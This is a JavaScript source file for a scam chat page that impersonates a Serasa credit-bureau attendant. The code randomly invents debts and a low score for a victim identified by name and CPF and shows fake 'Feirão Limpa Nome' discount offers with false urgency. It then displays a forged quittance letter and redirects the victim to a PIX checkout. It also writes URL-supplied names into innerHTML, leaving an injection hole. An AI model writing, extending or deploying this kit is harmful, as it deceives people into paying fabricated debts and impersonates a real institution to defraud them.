/**
 * Typebot Script - Simulação de Atendente Serasa
 * Gerencia o chat com delay e animações
 */

class TypebotChat {
    constructor() {
        this.messages = [];
        this.currentMessageIndex = 0;
        this.isTyping = false;
        this.userData = this.getUserDataFromURL();
        
        // Armazena os dados das dívidas para manter consistência
        this.debtData = {
            debts: [],
            totalDebt: 0,
            minValue: 0,
            maxValue: 0
        };
        
        this.initializeElements();
        this.startChat();
    }

    initializeElements() {
        this.chatMessages = document.getElementById('chatMessages');
        this.typingIndicator = document.getElementById('typingIndicator');
        this.actionSection = document.getElementById('actionSection');
        this.actionBtn = document.getElementById('actionBtn');
        this.attendantName = document.getElementById('attendantName');
    }

    getUserDataFromURL() {
        // Pega os dados do usuário da URL ou localStorage
        const urlParams = new URLSearchParams(window.location.search);
        const name = urlParams.get('name') || localStorage.getItem('userName') || 'Usuário';
        const cpf = urlParams.get('cpf') || localStorage.getItem('userCPF') || '';
        
        return {
            name: name,
            cpf: cpf,
            score: this.generateRandomScore()
        };
    }

    generateRandomScore() {
        // Gera um score entre 70 e 150, sempre "BAIXO"
        return Math.floor(Math.random() * 81) + 70; // 70 a 150
    }

    startChat() {
        // Define o nome do atendente baseado no nome do usuário
        this.setAttendantName();
        
        // Inicia a sequência de mensagens
        this.messages = [
            `Olá, ${this.userData.name}. Sou Renata, sua atendente da Serasa. Seja bem-vindo(a) ao canal oficial de atendimento.`,
            'Consulte grátis as ofertas disponíveis especialmente para você!',
            'Estamos conferindo seus dados. Por favor, aguarde um instante...'
        ];

        this.showNextMessage();
    }

    setAttendantName() {
        // Define nomes de atendentes baseados no nome do usuário
        const attendantNames = ['Renata'];
        const nameIndex = this.userData.name.length % attendantNames.length;
        const selectedName = attendantNames[nameIndex];
        this.attendantName.textContent = selectedName;
        
        // Atualiza a primeira mensagem com o nome correto
        this.messages[0] = `Olá, ${this.userData.name}. Sou ${selectedName}, sua atendente da Serasa. Seja bem-vindo(a) ao canal oficial de atendimento.`;
    }

    async showNextMessage() {
        if (this.currentMessageIndex >= this.messages.length) {
            // Após a última mensagem, inicia a verificação dos dados
            this.startDataVerification();
            return;
        }

        // Mostra indicador de digitação
        this.showTypingIndicator();

        // Delay antes de mostrar a mensagem
        await this.delay(2000 + Math.random() * 1000); // 2-3 segundos

        // Esconde indicador de digitação
        this.hideTypingIndicator();

        // Mostra a mensagem
        this.addMessage(this.messages[this.currentMessageIndex], 'attendant');

        // Delay antes da próxima mensagem
        await this.delay(1500);

        this.currentMessageIndex++;
        this.showNextMessage();
    }

    showTypingIndicator() {
        this.isTyping = true;
        this.typingIndicator.classList.add('show');
        this.scrollToBottom();
    }

    hideTypingIndicator() {
        this.isTyping = false;
        this.typingIndicator.classList.remove('show');
    }

    addMessage(text, sender) {
        const messageDiv = document.createElement('div');
        messageDiv.className = `message ${sender}`;
        
        // Suporta quebras de linha E HTML (negrito)
        messageDiv.innerHTML = text.replace(/\n/g, '<br>');
        
        this.chatMessages.appendChild(messageDiv);
        this.scrollToBottom();
    }

    async startDataVerification() {
        // Mostra indicador de digitação
        this.showTypingIndicator();

        // Delay de verificação (máximo 10 segundos)
        await this.delay(8000 + Math.random() * 2000); // 8-10 segundos

        // Esconde indicador de digitação
        this.hideTypingIndicator();

        // Mostra mensagem de dados verificados
        this.addMessage('Dados verificados com sucesso! Pode seguir para a próxima etapa.', 'attendant');

        // Delay antes de mostrar as informações
        await this.delay(2000);

        // Mostra as informações do cliente
        this.showClientInformation();
    }

    showClientInformation() {
        // Mostra indicador de digitação
        this.showTypingIndicator();

        // Delay antes de mostrar as informações
        setTimeout(() => {
            this.hideTypingIndicator();
            
            // Adiciona mensagem com as informações
            const attendantName = this.attendantName.textContent;
            const infoMessage = `Aqui estão suas informações verificadas:\n\n• Nome: ${this.userData.name}\n• Situação: Devedor na receita federal\n• Score: ${this.userData.score} pontos (Baixo)\n\nPara prosseguir com o acordo, clique em confirmar abaixo.`;
            
            this.addMessage(infoMessage, 'attendant');
            
            // Mostra botão de confirmação após delay
            setTimeout(() => {
                this.showConfirmButton();
            }, 2000);
            
        }, 2000);
    }

    showActionButton() {
        this.actionSection.classList.add('show');
        this.scrollToBottom();
    }

    scrollToBottom() {
        setTimeout(() => {
            this.chatMessages.scrollTop = this.chatMessages.scrollHeight;
        }, 100);
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Método para quando o usuário clicar no botão de ação (não usado mais)
    handleActionClick() {
        // Este método não é mais usado na nova sequência
        console.log('Botão de ação clicado (método não usado)');
    }

    showConfirmButton() {
        const confirmSection = document.createElement('div');
        confirmSection.className = 'confirm-section show';
        confirmSection.innerHTML = `
            <button class="confirm-btn" id="confirmBtn">Confirmar</button>
        `;
        
        this.chatMessages.appendChild(confirmSection);
        this.scrollToBottom();

        // Adiciona evento ao botão confirmar
        const confirmBtn = document.getElementById('confirmBtn');
        if (confirmBtn) {
            confirmBtn.addEventListener('click', () => {
                this.handleConfirmClick();
            });
        }
    }

    handleConfirmClick() {
        console.log('Usuário confirmou os dados');
        
        // Remove o botão de confirmação
        const confirmSection = document.querySelector('.confirm-section');
        if (confirmSection) {
            confirmSection.remove();
        }
        
        // Continua a conversa
        this.continueConversation();
    }

    async continueConversation() {
        // Gera protocolo aleatório
        const protocol = this.generateRandomProtocol();
        
        // Pega apenas o primeiro nome do usuário
        const firstName = this.userData.name.split(' ')[0];
        
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes da mensagem
        await this.delay(2000);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Mensagem de boas-vindas com protocolo
        const welcomeMessage = `${firstName}, seja bem-vindo(a) ao\natendimento do Feirão Limpa\nNome da Serasa.\n\nProtocolo do atendimento:\n${protocol}`;
        this.addMessage(welcomeMessage, 'attendant');
        
        // Delay antes de enviar a imagem
        await this.delay(3000);
        
        // Envia a imagem
        this.sendImage('typebot images/ultimo dia.png');
        
        // Delay antes da próxima mensagem
        await this.delay(4000);
        
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes da mensagem
        await this.delay(2000);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Mensagem sobre último dia
        const lastDayMessage = 'Último dia do Feirão Online Serasa Limpa Nome! Deseja consultar as ofertas disponíveis para o seu CPF?';
        this.addMessage(lastDayMessage, 'attendant');
        
        // Delay antes de mostrar o botão
        await this.delay(2000);
        
        // Mostra botão "Sim, consultar"
        this.showConsultButton();
    }

    generateRandomProtocol() {
        // Gera protocolo aleatório no formato: AMY3PK8JS
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let protocol = '';
        for (let i = 0; i < 9; i++) {
            protocol += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return protocol;
    }

    sendImage(imagePath) {
        const imageMessage = document.createElement('div');
        imageMessage.className = 'message attendant image-message';
        
        const img = document.createElement('img');
        img.src = imagePath;
        img.alt = 'Último dia do Feirão';
        img.className = 'chat-image';
        
        imageMessage.appendChild(img);
        this.chatMessages.appendChild(imageMessage);
        this.scrollToBottom();
    }

    showConsultButton() {
        const consultSection = document.createElement('div');
        consultSection.className = 'consult-section show';
        consultSection.innerHTML = `
            <button class="consult-btn" id="consultBtn">Sim, consultar</button>
        `;
        
        this.chatMessages.appendChild(consultSection);
        this.scrollToBottom();

        // Adiciona evento ao botão consultar
        const consultBtn = document.getElementById('consultBtn');
        if (consultBtn) {
            consultBtn.addEventListener('click', () => {
                this.handleConsultClick();
            });
        }
    }

    handleConsultClick() {
        console.log('Usuário clicou em "Sim, consultar"');
        
        // Remove o botão de consultar
        const consultSection = document.querySelector('.consult-section');
        if (consultSection) {
            consultSection.remove();
        }
        
        // Inicia análise de dívidas
        this.startDebtAnalysis();
    }

    async startDebtAnalysis() {
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes da mensagem de análise
        await this.delay(2000);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Mensagem de análise
        const analysisMessage = 'Por favor, aguarde enquanto analisamos a situação do seu CPF em nosso sistema...';
        this.addMessage(analysisMessage, 'attendant');
        
        // Delay para simular análise (8-12 segundos)
        const analysisTime = 8000 + Math.random() * 4000; // 8-12 segundos
        await this.delay(analysisTime);
        
        // Gera dívidas aleatórias e armazena para manter consistência
        const debts = this.generateRandomDebts();
        const totalDebt = debts.reduce((sum, debt) => sum + debt.value, 0);
        
        // Armazena os dados das dívidas para reutilizar no acordo
        this.debtData = {
            debts: debts,
            totalDebt: totalDebt,
            minValue: Math.min(...debts.map(d => d.value)),
            maxValue: Math.max(...debts.map(d => d.value))
        };
        
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes do resultado
        await this.delay(2000);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Mensagem com resultado da análise
        // Usa o nome completo do usuário que foi consultado anteriormente
        const userName = this.userData.name; // Nome completo do CPF consultado
        const debtCount = this.debtData.debts.length;
        const minValue = this.debtData.minValue;
        const maxValue = this.debtData.maxValue;
        
        // Função para formatar valores em reais
        const formatCurrency = (value) => {
            return value.toFixed(2)
                .replace('.', ',')
                .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
        };
        
        // Lista todas as dívidas identificadas com formatação em negrito
        let debtList = '';
        this.debtData.debts.forEach((debt, index) => {
            debtList += `• Dívida ${index + 1}: <strong>R$${formatCurrency(debt.value)}</strong>\n`;
        });
        
        const resultMessage = `Análise concluída!\n\n${userName}, identificamos <strong>${debtCount} dívidas ativas</strong> no sistema:\n\n${debtList}\nOs valores variam entre <strong>R$${formatCurrency(minValue)}</strong> e <strong>R$${formatCurrency(maxValue)}</strong>, totalizando uma dívida ativa de <strong>R$${formatCurrency(this.debtData.totalDebt)}</strong> em seu CPF.\n\nSituação para o CPF ${this.userData.cpf}: <strong>NEGATIVADO</strong>`;
        
        this.addMessage(resultMessage, 'attendant');
        
        // Delay antes de enviar o áudio
        await this.delay(3000);
        
        // Envia o áudio
        this.sendAudio('./typebot audios/analise primeiro audio.mp3');
        
        // Envia a imagem do score imediatamente após o áudio
        this.sendImage('typebot images/score.png');
        
        // Delay antes de mostrar o botão (independente do áudio)
        await this.delay(5000);
        
        // Mostra botão "Verificar acordo" automaticamente
        this.showVerifyAgreementButton();
    }

    generateRandomDebts() {
        // Gera número aleatório de dívidas entre 2 e 5
        const debtCount = Math.floor(Math.random() * 4) + 2; // 2 a 5 dívidas
        const debts = [];
        
        for (let i = 0; i < debtCount; i++) {
            // Gera valor aleatório entre R$ 465,50 e R$ 5.134,50
            const minValue = 465.50;
            const maxValue = 5134.50;
            const randomValue = Math.random() * (maxValue - minValue) + minValue;
            
            // Arredonda para 2 casas decimais
            const roundedValue = Math.round(randomValue * 100) / 100;
            
            debts.push({
                value: roundedValue
            });
        }
        
        // Ordena as dívidas por valor para facilitar a exibição
        debts.sort((a, b) => a.value - b.value);
        
        // Debug: verifica se o cálculo está correto
        const total = debts.reduce((sum, debt) => sum + debt.value, 0);
        console.log('Dívidas geradas:', debts);
        console.log('Total calculado:', total);
        
        return debts;
    }

    sendAudio(audioPath) {
        const audioMessage = document.createElement('div');
        audioMessage.className = 'message attendant audio-message';
        
        // Criar player customizado
        const playerContainer = document.createElement('div');
        playerContainer.className = 'audio-player-custom';
        
        // Botão play/pause
        const playBtn = document.createElement('div');
        playBtn.className = 'audio-play-btn';
        playBtn.innerHTML = '<i class="fas fa-play"></i>';
        
        // Timeline
        const timeline = document.createElement('div');
        timeline.className = 'audio-timeline';
        
        const progress = document.createElement('div');
        progress.className = 'audio-progress';
        timeline.appendChild(progress);
        
        // Tempo
        const timeDisplay = document.createElement('div');
        timeDisplay.className = 'audio-time';
        timeDisplay.textContent = '0:00';
        
        // Montar player
        playerContainer.appendChild(playBtn);
        playerContainer.appendChild(timeline);
        playerContainer.appendChild(timeDisplay);
        
        // Criar elemento audio oculto
        const audio = document.createElement('audio');
        audio.src = audioPath;
        audio.preload = 'metadata';
        audio.style.display = 'none';
        
        // Controle de play/pause
        let isPlaying = false;
        playBtn.addEventListener('click', () => {
            if (isPlaying) {
                audio.pause();
                playBtn.innerHTML = '<i class="fas fa-play"></i>';
                isPlaying = false;
            } else {
                audio.play().then(() => {
                    playBtn.innerHTML = '<i class="fas fa-pause"></i>';
                    isPlaying = true;
                }).catch((error) => {
                    console.warn('Erro ao reproduzir áudio:', error);
                    // Fallback visual
                    const fallbackMessage = document.createElement('div');
                    fallbackMessage.className = 'audio-fallback';
                    fallbackMessage.innerHTML = `
                        <div class="audio-placeholder">
                            <span class="audio-icon">🎵</span>
                            <span class="audio-text">Áudio: ${audioPath.split('/').pop()}</span>
                            <span class="audio-note">(Clique para reproduzir)</span>
                        </div>
                    `;
                    audioMessage.innerHTML = '';
                    audioMessage.appendChild(fallbackMessage);
                });
            }
        });
        
        // Atualizar progresso
        audio.addEventListener('timeupdate', () => {
            if (audio.duration) {
                const progressPercent = (audio.currentTime / audio.duration) * 100;
                progress.style.width = progressPercent + '%';
                
                // Atualizar tempo
                const minutes = Math.floor(audio.currentTime / 60);
                const seconds = Math.floor(audio.currentTime % 60);
                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            }
        });
        
        // Quando terminar
        audio.addEventListener('ended', () => {
            playBtn.innerHTML = '<i class="fas fa-play"></i>';
            isPlaying = false;
            progress.style.width = '0%';
            timeDisplay.textContent = '0:00';
        });
        
        // Erro de carregamento
        audio.addEventListener('error', (e) => {
            console.warn('Aviso: Áudio não pôde ser carregado:', audioPath);
            console.log('Isso é normal quando o arquivo é aberto diretamente no navegador (file://)');
            console.log('Para funcionar completamente, use um servidor local (http://)');
            
            // Fallback visual
            const fallbackMessage = document.createElement('div');
            fallbackMessage.className = 'audio-fallback';
            fallbackMessage.innerHTML = `
                <div class="audio-placeholder">
                    <span class="audio-icon">🎵</span>
                    <span class="audio-text">Áudio: ${audioPath.split('/').pop()}</span>
                    <span class="audio-note">(Clique para reproduzir)</span>
                </div>
            `;
            audioMessage.innerHTML = '';
            audioMessage.appendChild(fallbackMessage);
        });
        
        audioMessage.appendChild(playerContainer);
        audioMessage.appendChild(audio);
        this.chatMessages.appendChild(audioMessage);
        this.scrollToBottom();
        
        console.log('Áudio enviado:', audioPath);
    }

    showVerifyAgreementButton() {
        const verifySection = document.createElement('div');
        verifySection.className = 'verify-section show';
        verifySection.innerHTML = `
            <button class="verify-btn" id="verifyBtn">Verificar acordo</button>
        `;
        
        this.chatMessages.appendChild(verifySection);
        this.scrollToBottom();

        // Adiciona evento ao botão verificar
        const verifyBtn = document.getElementById('verifyBtn');
        if (verifyBtn) {
            verifyBtn.addEventListener('click', () => {
                this.handleVerifyAgreementClick();
            });
        }
    }

    handleVerifyAgreementClick() {
        console.log('Usuário clicou em "Verificar acordo"');
        
        // Remove o botão de verificar
        const verifySection = document.querySelector('.verify-section');
        if (verifySection) {
            verifySection.remove();
        }
        
        // Inicia verificação de acordo
        this.startAgreementVerification();
    }

    async startAgreementVerification() {
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes da mensagem de verificação
        await this.delay(2000);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Mensagem de verificação
        const verificationMessage = 'Aguarde um instante\nenquanto verificamos no\nsistema se há acordos\ndisponíveis para você...';
        this.addMessage(verificationMessage, 'attendant');
        
        // Delay para simular verificação
        await this.delay(4000);
        
        // Gera acordo aleatório
        const agreementCode = this.generateAgreementCode();
        const userName = this.userData.name;
        const userCPF = this.userData.cpf;
        
        // Calcula desconto de 98% da dívida total
        const totalDebt = this.calculateTotalDebt();
        const discountPercentage = 98.7;
        const discountAmount = totalDebt * (discountPercentage / 100);
        const finalValue = totalDebt - discountAmount;
        
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes do resultado
        await this.delay(2000);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Mensagem de acordo encontrado
        const agreementMessage = `Acordo encontrado! 1 (um) acordo foi localizado para ${userName}, CPF: ${userCPF}.\n\nAcessando o acordo ${agreementCode}...\n\nInformações do acordo ${agreementCode} para ${userName}\n\nAcordo: ${agreementCode}\nValor total da dívida: <strong>R$${this.formatCurrency(totalDebt)}</strong>`;
        this.addMessage(agreementMessage, 'attendant');
        
        // Delay antes dos valores
        await this.delay(3000);
        
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes dos valores
        await this.delay(1500);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Valor do contrato
        this.addMessage(`Valor do contrato: <strong>R$${this.formatCurrency(finalValue)}</strong>`, 'attendant');
        
        // Delay antes do desconto
        await this.delay(2000);
        
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes do desconto
        await this.delay(1500);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Desconto total
        const discountMessage = `Desconto total: <strong>${discountPercentage}%</strong>\n<strong>(R$${this.formatCurrency(discountAmount)})</strong>`;
        this.addMessage(discountMessage, 'attendant');
        
        // Delay antes do aviso
        await this.delay(2000);
        
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes do aviso
        await this.delay(1500);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Aviso sobre validade do contrato
        const warningMessage = `⚠️ Este contrato é válido apenas\npara o titular: ${userName}\nportador(a) do CPF\n${userCPF}.`;
        this.addMessage(warningMessage, 'attendant');
        
        // Delay antes do segundo áudio
        await this.delay(3000);
        
        // Envia o segundo áudio
        this.sendAudio('./typebot audios/segundo audio.mp3');
        
        // Delay antes da pergunta final
        await this.delay(4000);
        
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes da pergunta final
        await this.delay(2000);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Pergunta final
        const finalQuestion = 'Deseja realizar o acordo e ter seu nome limpo ainda hoje?';
        this.addMessage(finalQuestion, 'attendant');
        
        // Delay antes do botão final
        await this.delay(2000);
        
        // Mostra botão final
        this.showFinalAgreementButton();
    }

    generateAgreementCode() {
        // Gera código de acordo aleatório no formato: 83N2L618362E
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = '';
        for (let i = 0; i < 12; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code;
    }

    calculateTotalDebt() {
        // Retorna o total da dívida que foi armazenado na análise
        // Garante consistência entre análise e acordo
        return this.debtData.totalDebt;
    }

    formatCurrency(value) {
        return value.toFixed(2)
            .replace('.', ',')
            .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
    }

    showFinalAgreementButton() {
        const finalSection = document.createElement('div');
        finalSection.className = 'final-section show';
        finalSection.innerHTML = `
            <button class="final-btn" id="finalBtn">Sim, quero quitar minhas dívidas</button>
        `;
        
        this.chatMessages.appendChild(finalSection);
        this.scrollToBottom();

        // Adiciona evento ao botão final
        const finalBtn = document.getElementById('finalBtn');
        if (finalBtn) {
            finalBtn.addEventListener('click', () => {
                this.handleFinalAgreementClick();
            });
        }
    }

    handleFinalAgreementClick() {
        console.log('Usuário clicou em "Sim, quero quitar minhas dívidas"');
        
        // Remove o botão final
        const finalSection = document.querySelector('.final-section');
        if (finalSection) {
            finalSection.remove();
        }
        
        // Inicia confirmação do acordo
        this.startAgreementConfirmation();
    }

    async startAgreementConfirmation() {
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes da confirmação
        await this.delay(2000);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Mensagem de confirmação
        this.addMessage('Confirmando acordo, aguarde...', 'attendant');
        
        // Delay para simular processamento
        await this.delay(3000);
        
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes da informação da Serasa
        await this.delay(2000);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Informação da Serasa
        const serasaInfo = `SERASA INFORMA:\n\nAo efetuar o pagamento do acordo, <strong>todas as dívidas em aberto</strong> no CPF <strong>${this.userData.cpf}</strong> serão removidas em até <strong>1 hora</strong>, e você terá seu nome <strong>limpo novamente!</strong>`;
        this.addMessage(serasaInfo, 'attendant');
        
        // Delay antes da confirmação final
        await this.delay(3000);
        
        // Mostra indicador de digitação
        this.showTypingIndicator();
        
        // Delay antes da confirmação final
        await this.delay(1500);
        
        // Esconde indicador de digitação
        this.hideTypingIndicator();
        
        // Confirmação final
        this.addMessage('Parabéns! Seu acordo foi confirmado!', 'attendant');
        
        // Delay antes de mostrar a carta de quitação
        await this.delay(3000);
        
        // Mostra a carta de quitação
        this.showQuittanceLetter();
    }

    showQuittanceLetter() {
        // Calcula os valores finais
        const totalDebt = this.debtData.totalDebt;
        const discountPercentage = 98.7;
        const discountAmount = totalDebt * (discountPercentage / 100);
        const finalValue = totalDebt - discountAmount;
        
        // Gera data atual
        const today = new Date();
        const day = String(today.getDate()).padStart(2, '0');
        const month = String(today.getMonth() + 1).padStart(2, '0');
        const year = today.getFullYear();
        const currentDate = `${day}/${month}/${year}`;
        
        // Cria a carta de quitação
        const quittanceLetter = document.createElement('div');
        quittanceLetter.className = 'quittance-letter';
        quittanceLetter.innerHTML = `
            <div class="quittance-header">
                <div class="serasa-banner">SERASA</div>
                <h1 class="quittance-title">Carta de Quitação</h1>
            </div>
            
            <div class="quittance-content">
                <p class="quittance-intro">
                    Na qualidade de Serasa, com base na prestação de serviços realizados ao Sr./Sra. 
                    <strong>${this.userData.name}</strong>, portador(a) do CPF <strong>${this.userData.cpf}</strong>, informamos que:
                </p>
                
                <div class="quittance-discount">
                    <span class="checkmark">✔</span>
                    O serviço será realizado com base no programa do Feirão Limpa Nome, onde o(a) mesmo(a) obteve um desconto de <strong>${discountPercentage}%</strong> na quitação de todos os débitos em aberto.
                </div>
                
                <h2 class="debt-details-title">Detalhes da dívida</h2>
                
                <div class="debt-details">
                    <div class="detail-item">
                        <span class="checkmark">✓</span>
                        Acordo: Gerido e processado pela Serasa.
                    </div>
                    <div class="detail-item">
                        <span class="checkmark">✓</span>
                        Valor total: <strong>R$ ${this.formatCurrency(finalValue)}</strong>.
                    </div>
                    <div class="detail-item">
                        <span class="checkmark">✓</span>
                        Forma de pagamento: <strong>PIX</strong>.
                    </div>
                    <div class="detail-item">
                        <span class="checkmark">✓</span>
                        Acordo válido somente hoje: <span class="date-tag">${currentDate}</span>
                    </div>
                </div>
                
                <div class="warning-alert">
                    <div class="warning-icon">⚠️</div>
                    <div class="warning-text">
                        Atenção: O não pagamento deste acordo pode gerar novas restrições no CPF e impedir participações futuras em programas como o Feirão.
                    </div>
                </div>
            </div>
        `;
        
        this.chatMessages.appendChild(quittanceLetter);
        this.scrollToBottom();
        
        // Delay antes de mostrar o botão de pagamento
        setTimeout(() => {
            this.showPaymentButton();
        }, 2000);
    }

    showPaymentButton() {
        const paymentSection = document.createElement('div');
        paymentSection.className = 'payment-section show';
        paymentSection.innerHTML = `
            <button class="payment-btn" id="paymentBtn">
                <span class="payment-text">Acessar área de pagamento</span>
                <span class="payment-icon">🔒</span>
            </button>
        `;
        
        this.chatMessages.appendChild(paymentSection);
        this.scrollToBottom();

        // Adiciona evento ao botão de pagamento
        const paymentBtn = document.getElementById('paymentBtn');
        if (paymentBtn) {
            paymentBtn.addEventListener('click', () => {
                this.handlePaymentClick();
            });
        }
    }

    handlePaymentClick() {
        console.log('Usuário clicou em "Acessar área de pagamento"');
        
        // Calcula os valores finais
        const totalDebt = this.debtData.totalDebt;
        const discountPercentage = 98.7;
        const discountAmount = totalDebt * (discountPercentage / 100);
        const finalAmount = totalDebt - discountAmount;
        
        // Log dos valores para debug
        console.log('💰 Valores calculados:');
        console.log('- Total da dívida:', totalDebt);
        console.log('- Desconto (98.7%):', discountAmount);
        console.log('- Valor final:', finalAmount);
        console.log('- Nome do cliente:', this.userData.name);
        console.log('- CPF do cliente:', this.userData.cpf);
        
        // Armazena os dados no localStorage para o checkout
        localStorage.setItem('totalDebt', totalDebt.toString());
        localStorage.setItem('discountAmount', discountAmount.toString());
        localStorage.setItem('finalAmount', finalAmount.toString());
        localStorage.setItem('userName', this.userData.name);
        localStorage.setItem('userCPF', this.userData.cpf);
        
        console.log('✅ Dados salvos no localStorage');
        
        // Redireciona para o checkout
        window.location.href = 'checkout.html';
    }
}

// Inicialização quando o DOM estiver carregado
document.addEventListener('DOMContentLoaded', () => {
    const typebot = new TypebotChat();
    
    // Adiciona evento ao botão de ação
    const actionBtn = document.getElementById('actionBtn');
    if (actionBtn) {
        actionBtn.addEventListener('click', () => {
            typebot.handleActionClick();
        });
    }
    
    // Torna disponível globalmente para debug
    window.typebot = typebot;
    
    console.log('🤖 Typebot inicializado com sucesso!');
});
